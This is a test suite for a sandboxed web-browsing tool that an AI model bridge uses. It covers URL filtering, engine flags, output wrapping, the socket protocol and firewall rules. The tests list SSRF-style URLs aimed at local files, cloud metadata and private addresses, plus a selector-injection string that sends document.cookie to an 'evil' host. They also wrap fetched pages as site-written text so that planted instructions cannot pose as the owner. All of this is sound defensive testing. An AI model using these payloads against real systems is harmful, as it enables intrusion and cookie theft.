"""The sandboxed browser: request checks, the exact engine command line, turning output into an answer,
the socket protocol, the `browse` client and the bridge's tool stripping."""

from __future__ import annotations

import json
import os
import socket
import sys
import time
from pathlib import Path

import pytest
from fake_obscura import behave

from ampi_tools import browser, browser_net
from ampi_tools import client as cli
from ampi_tools.browser import Refused, build_argv, check_url, handle
from assistant_bridge.bot import is_browse_rule, watcher_tools, without_browse
from assistant_bridge.config import ConfigError, Watcher

FAKE = str(Path(__file__).with_name("fake_obscura.py"))
POSIX = os.name == "posix"


def fake_run(mode="ok", calls=None):
    def run(argv, kill_after=browser.KILL_AFTER, client=None):
        if calls is not None:
            calls.append(argv)
        if mode == "oom":
            return -9, b"", b"", False
        if mode == "abort":
            return -6, b"", b"#\n# Fatal JavaScript invalid size error\n# Reached heap limit\n", False
        if mode == "killed-timeout":
            return None, b"", b"", False
        code, out, err = behave(argv, mode)
        return code, out.encode(), err.encode(), False
    return run


def ask(req, mode="ok", calls=None):
    return handle(req, fake_run(mode, calls))


# --- URL and argument checks ----------------------------------------------------------------------

@pytest.mark.parametrize("url", [
    "file:///etc/passwd", "javascript:alert(1)", "data:text/html,hi", "ftp://example.com/", "chrome://settings",
    "http://user:pw@example.com/", "http://example.com@evil.com/", "http://127.0.0.1/", "http://localhost/",
    "http://10.0.0.5/", "http://169.254.169.254/latest/meta-data", "http://[::1]/", "http://[::ffff:127.0.0.1]/",
    "http://[64:ff9b::a00:1]/", "http://[fe80::1%25eth0]/", "http://2130706433/", "http://0x7f.1/",
    "http://017.0.0.1/", "http://127.1/", "http://example.123/", "http://printer/", "http://nas.local/",
    "http://foo.internal/", "https://example.com:8080/", "https://example.com:22/", "https://www.youtube.com/watch?v=x",
    "https://youtu.be/x", "https://m.youtube.com/", "https://www.youtube-nocookie.com/embed/x",
    "https://rr1---sn-x.googlevideo.com/v", "https://exa mple.com/", "https://example.com/‮evil",
    "http://" + "a" * 2100 + ".com/", "http://100.64.1.1/", "http://[2002:7f00:1::]/", "",
    # look-alike dots and digits become plain ones in the engine (IDNA)
    "http://127。0。0。1/", "http://169。254。169。254/latest", "http://0x7f。1/",
    "http://127．0．0．1/", "http://１２７.0.0.1/", "http://evil.com\\@127.0.0.1/",
    "http://127.0.0.1\\.example.com/", "https://www.youtube.de/watch?v=x", "https://youtube.co.uk/",
    "https://consent.youtube.com/", "http://[::]/", "http://[fd00::1]/", "http://[::a9fe:a9fe]/",
])
def test_unsafe_or_unsupported_links_are_refused(url):
    with pytest.raises(Refused):
        check_url(url)


def test_ordinary_links_pass_and_are_made_ascii():
    assert check_url("https://example.com") == "https://example.com/"
    assert check_url("http://93.184.215.14:80/a b".replace(" ", "%20")) == "http://93.184.215.14:80/a%20b"
    assert check_url("https://bücher.de/straße?q=é") == "https://xn--bcher-kva.de/stra%C3%9Fe?q=%C3%A9"
    assert check_url("HTTPS://Example.COM./x#frag") == "https://example.com/x#frag"
    assert check_url("https://[2606:4700:4700:0::1111]/dns") == "https://[2606:4700:4700::1111]/dns"
    assert check_url("https://8.8.8.8:443/") == "https://8.8.8.8:443/"
    assert check_url("https://youtube-tutorials.example.org/") == "https://youtube-tutorials.example.org/"


def test_watcher_and_group_runs_cant_browse():
    req = {"op": "read", "url": "https://example.com/"}
    for origin in ("watcher:gmail-inbox", "group:clipboard"):
        assert "outside content" in ask({**req, "origin": origin})["error"]
    assert ask({**req, "origin": None})["ok"]


@pytest.mark.parametrize("field,value", [
    ("css", "a\u0000b"), ("css", "x" * 201), ("attr", "on click"), ("attr", "a\"b"), ("wait_for", "​div"),
    ("match", 5), ("wait_for", "--allow-private-network"), ("css", "-x"),
])
def test_bad_extra_arguments_are_refused(field, value):
    req = {"op": "select", "url": "https://example.com/", "css": "div", field: value}
    assert not ask(req)["ok"]


# --- the engine command line ----------------------------------------------------------------------

def test_exact_command_lines():
    url = "https://example.com/"
    read = build_argv("read", url, engine="obscura")
    assert read[:5] == ["obscura", f"--v8-flags={browser.V8_FLAGS}", "--user-agent", browser.USER_AGENT, "fetch"]
    assert read[5:] == [url, "--dump", "markdown", "-q", "--timeout", "20"]
    assert build_argv("read", url, text=True, wait_for="main", engine="o")[-3:] == ["--timeout", "20",
                                                                                    "--selector=main"]
    assert ask({"op": "read", "url": url, "wait_for": "div.x"})["ok"]  # the fake accepts the = form
    assert "links" in build_argv("links", url, engine="o")
    sel = build_argv("select", url, css="div.price", attr="href", engine="o")
    assert "--dump" not in sel and "--selector" not in sel and sel[-2] == "-e"
    for argv in (read, sel):
        assert not {"--stealth", "--allow-private-network", "--proxy", "--obey-robots"} & set(argv)
        assert "--jitless" in argv[1] and "AmpiBrowser/" in argv[3]


def test_the_fake_engine_enforces_the_real_flag_rules():
    assert behave(["obscura", "--v8-flags", "--jitless", "fetch", "https://x/"], "ok")[0] == 2
    assert behave(["obscura", "fetch", "https://x/", "--v8-flags=--jitless"], "ok")[0] == 2
    # -e with --dump: the real binary drops the eval result and prints the page
    code, out, _ = behave(["obscura", "fetch", "https://x/", "--dump", "markdown", "-e", "1"], "ok")
    assert code == 0 and "Example Domain" in out


def test_selector_text_can_never_break_out_of_the_script():
    nasty = "a'); fetch('https://evil/'+document.cookie); ('\\\"</script> "
    js = browser.select_js(nasty, None)
    assert json.dumps(nasty, ensure_ascii=True) in js
    assert "fetch('https://evil/" not in js.replace(json.dumps(nasty, ensure_ascii=True), "")


def test_every_op_runs_through_the_engine_with_the_checked_url():
    calls = []
    for op in ("read", "links", "select"):
        assert ask({"op": op, "url": "https://example.com", "css": "p"}, calls=calls)["ok"], op
    assert all(c[5] == "https://example.com/" for c in calls)


# --- answers --------------------------------------------------------------------------------------

def test_pages_come_back_marked_as_written_by_the_site():
    text = ask({"op": "read", "url": "https://example.com/"})["text"]
    assert text.startswith("Web page (requested URL: https://example.com/; written by the site, not by your owner")
    assert "‹‹‹\n# Example Domain" in text and text.rstrip().endswith("›››")


def test_pages_cant_fake_the_end_marker_or_hide_text():
    text = ask({"op": "read", "url": "https://example.com/"}, mode="markers")["text"]
    inner = text.split("‹‹‹\n", 1)[1].rsplit("\n›››", 1)[0]
    assert "››" not in inner and "‹‹" not in inner and "❯❯❯" not in inner
    assert "‮" not in inner and "​" not in inner
    assert ">>> print(1)" in inner  # ordinary code stays
    assert "›" not in browser.wrap("u", "a ›‍›‌› b").split("‹‹‹\n", 1)[1].rsplit("\n›››", 1)[0]


@pytest.mark.parametrize("title", ["Robot - Wikipedia", "Blocked drains in London", "Access control basics",
                                   "Security checklist for shops"])
def test_ordinary_titles_are_not_bot_checks(title):
    assert not browser.looks_like_bot_check("", title)
    assert browser.looks_like_bot_check("", "Just a moment...")


def test_cleaning_keeps_scripts_that_need_joiners():
    assert browser.clean("می‌خواهم \U0001f469‍\U0001f4bb a b") == "می‌خواهم \U0001f469‍\U0001f4bb a\nb"


def test_ordinary_pages_mentioning_captchas_are_not_bot_checks():
    assert ask({"op": "read", "url": "https://example.com/"}, mode="recaptcha-footer")["ok"]

    def captcha_items(argv, kill_after=0, client=None):
        return 0, json.dumps({"href": "https://example.com/", "title": "Docs", "count": 1,
                              "items": ["How to add a captcha"]}).encode(), b"", False
    assert handle({"op": "select", "url": "https://example.com/", "css": "h2"}, captcha_items)["ok"]


def test_the_url_never_decides_the_error_message():
    reply = ask({"op": "read", "url": "https://example.com/private/timed-out-blocked"}, mode="dns")
    assert "doesn't exist" in reply["error"]


def test_link_labels_over_several_lines_stay_together():
    text = ask({"op": "links", "url": "https://example.com/"}, mode="multiline-links")["text"]
    assert "First line two — https://a.com/x" in text and "Second — https://b.com/y" in text


def test_the_shown_url_is_escaped_and_short():
    text = ask({"op": "read", "url": "https://example.com/" + "%0A%E2%80%AEx" * 60})["text"]
    head = text.split("\n", 1)[0]
    assert len(head) < 450 and "‮" not in head


@pytest.mark.parametrize("mode,words", [
    ("botcheck", "bot check"), ("empty", "no readable text"), ("timeout", "in time"), ("deadline", "in time"),
    ("killed-timeout", "in time"), ("private", "private or blocked"), ("dns", "doesn't exist"),
    ("oom", "too much memory"), ("abort", "too much memory"),
])
def test_failures_become_short_plain_messages(mode, words):
    reply = ask({"op": "read", "url": "https://example.com/?secret=abc"}, mode=mode)
    assert not reply["ok"] and words in reply["error"]
    assert "secret" not in reply["error"] and "example.com" not in reply["error"]


def test_links_are_absolute_deduplicated_and_filterable():
    text = ask({"op": "links", "url": "https://example.com/"})["text"]
    assert "More information — https://iana.org/x" in text and "javascript:" not in text
    assert text.count("https://iana.org/x") == 1 and "\nhttps://example.com/blank\n" in text
    only = ask({"op": "links", "url": "https://example.com/", "match": "NEXT"})["text"]
    assert "Next page — https://example.com/next?p=2" in only and "iana" not in only


def test_select_lists_the_matches_with_the_title():
    text = ask({"op": "select", "url": "https://example.com/", "css": "li"})["text"]
    assert "Title: Example" in text and "- one\n- two three" in text and "(showing 2 of 3)" in text
    assert "didn't work" in ask({"op": "select", "url": "https://example.com/", "css": "li"}, "selecterr")["error"]


def test_redirects_to_youtube_are_refused():
    assert "youtube command" in ask({"op": "select", "url": "https://bit.ly/x", "css": "a"}, "redirect-yt")["error"]

    # a redirect to YouTube hits the unit's /etc/hosts block (0.0.0.0), which the engine reports as private
    assert "youtube command" in ask({"op": "read", "url": "https://bit.ly/x"}, mode="private")["error"]


def test_huge_pages_are_cut():
    def huge(argv, kill_after=0, client=None):
        return 0, b"y" * (browser.MAX_TEXT + 10), b"", False
    text = handle({"op": "read", "url": "https://example.com/"}, huge)["text"]
    assert f"cut at {browser.MAX_TEXT:,}" in text


def test_status_runs_javascript_with_the_real_flags():
    calls = []
    assert ", working." in ask({"op": "status"}, calls=calls)["text"]
    page = calls[-1]
    assert page[1] == f"--v8-flags={browser.V8_FLAGS}" and page[5].startswith("file://") and page[-1] == "document.title"
    assert "not working" in ask({"op": "status"}, mode="nojs")["text"]
    assert "not working" in ask({"op": "status"}, mode="oom")["text"]


def test_a_sandbox_kill_is_reported_as_such():
    def sigsys(argv, kill_after=0, client=None):
        return -31, b"", b"", False
    assert "sandbox limit" in handle({"op": "read", "url": "https://example.com/"}, sigsys)["error"]


def test_unexpected_errors_never_leak_details():
    def boom(argv, kill_after=0, client=None):
        raise RuntimeError("https://example.com/?token=SECRET")
    reply = handle({"op": "read", "url": "https://example.com/"}, boom)
    assert reply == {"ok": False, "error": "the browser service failed"}


# --- running the real subprocess (POSIX only) -----------------------------------------------------

posix_only = pytest.mark.skipif(not POSIX, reason="process groups and fork are POSIX")


def _engine(mode, monkeypatch, tmp_path, **env):
    """The engine gets a cleared environment, so the fake's settings travel in a launcher script."""
    monkeypatch.setenv("AMPI_BROWSER_HOME", str(tmp_path / "h"))
    launcher = tmp_path / "launch.py"
    launcher.write_text(
        "import os, runpy, sys\n"
        f"os.environ.update({json.dumps({'FAKE_OBSCURA_MODE': mode, **env})})\n"
        f"sys.argv = [{FAKE!r}, 'fetch', 'https://example.com/', '--dump', 'markdown']\n"
        f"runpy.run_path({FAKE!r}, run_name='__main__')\n")
    return [sys.executable, str(launcher)]


@posix_only
def test_the_engine_gets_no_client_socket_and_no_extra_fds(tmp_path):
    """Run run_engine in a process whose fd 0 IS a socket (as in the real unit) and look from the child."""
    probe = tmp_path / "probe.py"
    probe.write_text("import os\nfds=sorted(int(f) for f in os.listdir('/proc/self/fd'))\n"
                     "print(os.readlink('/proc/self/fd/0'), fds)\n")
    driver = tmp_path / "driver.py"
    driver.write_text(
        "import json, os, socket, sys\n"
        f"sys.path.insert(0, {str(Path(browser.__file__).parent)!r})\n"
        "import browser\n"
        "a, b = socket.socketpair()\n"
        "os.dup2(a.fileno(), 0)\n"
        f"code, out, err, _ = browser.run_engine([sys.executable, {str(probe)!r}], 10)\n"
        "print(json.dumps([code, out.decode(), err.decode()]))\n")
    import subprocess
    res = subprocess.run([sys.executable, str(driver)], capture_output=True, text=True, timeout=30,
                         env={**os.environ, "AMPI_BROWSER_HOME": str(tmp_path / "h")})
    code, out, _ = json.loads(res.stdout.strip().splitlines()[-1])
    assert code == 0
    target, fds = out.split(" ", 1)
    assert target == "/dev/null" and max(json.loads(fds)) <= 3  # 0-2 plus the listdir fd


@posix_only
def test_a_hanging_engine_is_killed_with_everything_it_started(monkeypatch, tmp_path):
    pidfile = tmp_path / "child.pid"
    argv = _engine("hang", monkeypatch, tmp_path, FAKE_OBSCURA_CHILD_PIDFILE=str(pidfile))
    began = time.monotonic()
    code, _, _, _ = browser.run_engine(argv, kill_after=2)
    assert code is None and time.monotonic() - began < 10
    time.sleep(0.3)
    child = int(pidfile.read_text())
    with pytest.raises(ProcessLookupError):
        os.kill(child, 0)


@posix_only
def test_too_much_output_stops_the_engine(monkeypatch, tmp_path):
    code, out, _, too_big = browser.run_engine(_engine("huge", monkeypatch, tmp_path), 20)
    assert too_big and len(out) <= browser.MAX_OUTPUT


@posix_only
def test_the_engine_stops_when_the_caller_hangs_up(monkeypatch, tmp_path):
    a, b = socket.socketpair()
    with a:
        b.close()
        began = time.monotonic()
        code, _, _, _ = browser.run_engine(_engine("hang", monkeypatch, tmp_path), 30, client=a)
    assert code is None and time.monotonic() - began < 5


@posix_only
def test_a_waiting_caller_does_not_stop_the_engine(monkeypatch, tmp_path):
    a, b = socket.socketpair()
    with a, b:  # connected and silent, like the browse client
        code, out, _, _ = browser.run_engine(_engine("ok", monkeypatch, tmp_path), 30, client=a)
    assert code == 0 and b"Example Domain" in out


@posix_only
def test_the_socket_protocol():
    a, b = socket.socketpair()
    with a, b:
        b.sendall(b'{"op": "read", ')
        b.sendall(b'"url": "https://example.com/"}\n')
        reply = browser.serve_connection(a, {os.getuid()}, fake_run())
        assert reply["ok"]
        got = json.loads(b.recv(1 << 20))
        assert got == reply
    a, b = socket.socketpair()
    with a, b:
        b.sendall(b'{"op": "status"}\n')
        assert browser.serve_connection(a, {os.getuid() + 1}, fake_run()) == {"ok": False, "error": "not allowed"}
    a, b = socket.socketpair()
    with a, b:
        b.sendall(b"x" * (browser.MAX_REQUEST + 10))
        assert "too big" in browser.serve_connection(a, {os.getuid()}, fake_run())["error"]


# --- the browse client ----------------------------------------------------------------------------

def test_the_client_sends_the_request_and_origin(monkeypatch, capsys, tmp_path):
    sent = []
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path))
    monkeypatch.setenv("AMPI_ORIGIN", "group:x")
    monkeypatch.setattr(cli, "browser_request", lambda p, **k: sent.append(p) or {"ok": True, "text": "page"})
    assert cli.browse_main(["select", "https://example.com", "li.item", "--attr", "href"]) == 0
    assert sent == [{"op": "select", "origin": "group:x", "url": "https://example.com", "css": "li.item",
                     "attr": "href"}]
    assert capsys.readouterr().out.strip() == "page"


def test_the_client_retries_once_when_the_slot_is_taken(monkeypatch, capsys, tmp_path):
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path))
    monkeypatch.setattr(cli.time, "sleep", lambda s: None)
    replies = [None, None]
    monkeypatch.setattr(cli, "browser_request", lambda p, **k: replies.pop(0))
    assert cli.browse_main(["read", "https://example.com"]) == 1
    assert "busy or not working" in capsys.readouterr().err and not replies


def test_the_client_does_not_retry_a_slow_failure(monkeypatch, capsys, tmp_path):
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path))
    clock = [0.0]
    monkeypatch.setattr(cli.time, "monotonic", lambda: clock[0])

    def slow(p, **k):
        clock[0] += 5
        return None
    calls = []
    monkeypatch.setattr(cli, "browser_request", lambda p, **k: calls.append(1) or slow(p))
    assert cli.browse_main(["read", "https://example.com"]) == 1 and len(calls) == 1


def test_long_pages_are_saved_and_previewed(monkeypatch, capsys, tmp_path):
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "state"))
    monkeypatch.chdir(tmp_path)
    body = "Web page (requested URL: x)\n‹‹‹\n" + "word " * 5000 + "\n›››"
    monkeypatch.setattr(cli, "browser_request", lambda p, **k: {"ok": True, "text": body})
    assert cli.browse_main(["read", "https://Exa_mple.com/a/../b?q=1"]) == 0
    out = capsys.readouterr().out
    saved = list((tmp_path / "web").glob("*.md"))
    assert len(saved) == 1 and saved[0].name.startswith("example.com-") and saved[0].read_text().strip() == body
    assert "saved to web/example.com-" in out and len(out) < cli.BROWSE_PREVIEW + 400


def test_saving_never_follows_a_planted_symlink(tmp_path):
    (tmp_path / "web").mkdir()
    victim = tmp_path / "victim"
    victim.write_text("keep")
    url = "https://example.com/"
    name = cli.save_page("x", url, tmp_path).name
    (tmp_path / "web" / name).unlink()
    try:
        (tmp_path / "web" / name).symlink_to(victim)
    except OSError:
        pytest.skip("no symlinks here")
    cli.save_page("new", url, tmp_path)
    assert victim.read_text() == "keep"


def test_old_saved_pages_are_pruned_but_other_files_are_kept(tmp_path):
    first = cli.save_page("a", "https://a.com/", tmp_path, now=time.time())
    mine = tmp_path / "web" / "notes.md"
    mine.write_text("owner's")
    for f in (first, mine):
        os.utime(f, (time.time() - 2 * 86400,) * 2)
    cli.save_page("b", "https://b.com/", tmp_path)
    assert not first.exists() and mine.exists()


def test_the_hourly_guard(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path))
    now = 1_000_000.0
    assert all(cli._browse_budget(now + i) for i in range(cli.BROWSE_PER_HOUR))
    assert not cli._browse_budget(now + 200)
    assert cli._browse_budget(now + 3700)


def test_the_client_waits_less_than_the_bash_timeout():
    assert cli.BROWSE_TOTAL < 120 and cli.BROWSE_LOCK_WAIT < cli.BROWSE_TOTAL


# --- bridge: watchers and groups don't get the browser --------------------------------------------

@pytest.mark.parametrize("rule", ["Bash(browse:*)", "Bash(browse *)", "Bash(browse read:*)", " Bash( browse:*) ",
                                  "Bash(/home/assistant/.local/bin/browse:*)", "Bash(*)", "Bash(brow*)", "Bash",
                                  "Bash(env browse:*)", "Bash(/usr/bin/env browse read:*)", "Bash(env:*)",
                                  "Bash(sh:*)", "Bash(python3:*)", "Bash(/usr/bin/timeout:*)", "Bash(uv run:*)"])
def test_every_spelling_of_a_browse_rule_is_recognised(rule):
    assert is_browse_rule(rule)


@pytest.mark.parametrize("rule", ["Bash(youtube:*)", "Read", "WebFetch", "Bash(browser-notes:*)", "Bash(gmail:*)"])
def test_other_rules_are_kept(rule):
    assert not is_browse_rule(rule)


def test_watchers_lose_browse_even_with_their_own_tool_list():
    class P:
        allowed_tools = ("Read", "WebFetch", "Bash(browse:*)", "Bash(todoist:*)")
    w = Watcher(name="w", kind="gmail", query="in:inbox", every_minutes=5)
    assert watcher_tools(w, P()) == ("Read", "Bash(todoist:*)")
    w2 = Watcher(name="w", kind="gmail", query="x", every_minutes=5, allowed_tools=("Read", "Bash(browse *)"))
    assert watcher_tools(w2, P()) == ("Read",)
    assert without_browse(["Bash(browse:*)", "Edit"]) == ("Edit",)


def test_a_bare_bash_rule_in_a_watcher_is_a_config_error(tmp_path, monkeypatch):
    from assistant_bridge import config
    monkeypatch.setenv("BOT_TOKEN", "123:abc")
    cfg = tmp_path / "c.toml"
    cfg.write_text(f"""
claude_command = "claude"
[[profiles]]
name = "main"
bot_token_env = "BOT_TOKEN"
owner_ids = [1]
workspace = "{(tmp_path / 'ws').as_posix()}"
[[profiles.watchers]]
name = "w"
kind = "gmail"
query = "in:inbox"
every_minutes = 5
allowed_tools = ["Read", "Bash"]
""")
    with pytest.raises(ConfigError, match="bare Bash"):
        config.load_config(cfg)


# --- the firewall generator -----------------------------------------------------------------------

IP_JSON = json.dumps([
    {"ifname": "lo", "addr_info": [{"local": "127.0.0.1"}, {"local": "::1"}]},
    {"ifname": "eth0", "addr_info": [{"local": "1.2.3.4"}, {"local": "2a00:1111:2222:3333::1"},
                                     {"local": "fe80::9000:7ff:fe21:a705"}]},
])


def test_the_firewall_denies_own_and_private_addresses_and_allows_only_web_ports():
    own4, own6 = browser_net.own_networks(IP_JSON)
    assert own4 == ["1.2.3.4/32"] and own6 == ["2a00:1111:2222:3333::/64"]
    rules = browser_net.ruleset(999, own4, own6, list(browser_net.DEFAULT_RESOLVERS))
    assert "1.2.3.4/32" in rules and "2a00:1111:2222:3333::/64" in rules
    assert "10.0.0.0/8" in rules and "169.254.0.0/16" in rules and "fc00::/7" in rules
    assert "meta skuid 999 tcp dport { 80, 443 } accept" in rules
    assert rules.rstrip().splitlines()[-3].strip() == "meta skuid 999 drop"
    assert "185.12.64.1, 185.12.64.2" in rules and "th dport 53 accept" in rules
    assert "limit rate over 600/minute" in rules
    # every rule is for the browser's user only
    assert all("meta skuid 999" in ln for ln in rules.splitlines() if ln.strip().startswith("meta"))


def test_the_firewall_sets_never_overlap():
    import ipaddress
    own4, own6 = browser_net.own_networks(IP_JSON)
    for nets in (browser_net._collapse(list(browser_net.DENY4) + own4 + ["10.1.2.3/32"]),
                 browser_net._collapse(list(browser_net.DENY6) + own6)):
        parsed = [ipaddress.ip_network(n) for n in nets]
        assert not any(a != b and a.overlaps(b) for a in parsed for b in parsed)


def test_generated_files_block_youtube_and_list_only_needed_users():
    files = browser_net.files(999, 998, ["185.12.64.1", "2a01:4ff:ff00::add:1"])
    assert "0.0.0.0 www.youtube.com" in files["hosts"] and "0.0.0.0 youtu.be" in files["hosts"]
    assert files["resolv.conf"].startswith("nameserver 185.12.64.1\nnameserver 2a01:4ff:ff00::add:1\n")
    assert [ln.split(":")[0] for ln in files["passwd"].splitlines()] == ["root", "ampibrowser", "nobody"]


def test_private_resolvers_are_refused(tmp_path):
    f = tmp_path / "resolvers"
    f.write_text("127.0.0.53\n")
    with pytest.raises(SystemExit):
        browser_net.read_resolvers(str(f))
